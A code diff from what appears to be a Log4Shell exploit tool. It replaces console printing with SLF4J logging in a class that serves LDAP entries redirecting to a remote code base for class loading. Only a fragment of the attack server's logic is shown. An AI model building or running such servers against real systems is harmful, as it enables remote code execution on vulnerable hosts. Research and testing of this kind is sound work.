@@ -2,8 +2,12 @@ package log4shell;
 
 import com.unboundid.ldap.sdk.DN;
 import com.unboundid.ldap.sdk.Entry;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 public final class RunCommand extends Command {
+  private static final Logger log = LoggerFactory.getLogger(RunCommand.class);
+
   private final Config config;
   private final String className;
 
@@ -17,8 +21,7 @@ public final class RunCommand extends Command {
   public Entry response() {
     String codebase = config.getHttpServerUri().toASCIIString();
 
-    System.out.printf(
-        "Send LDAP entry for DN «%s» redirecting to code base «%s»%n", getDn(), codebase);
+    log.info("Send LDAP entry for DN «{}» redirecting to code base «{}»", getDn(), codebase);
 
     Entry entry = new Entry(getDn());
     entry.addAttribute("objectClass", "top");
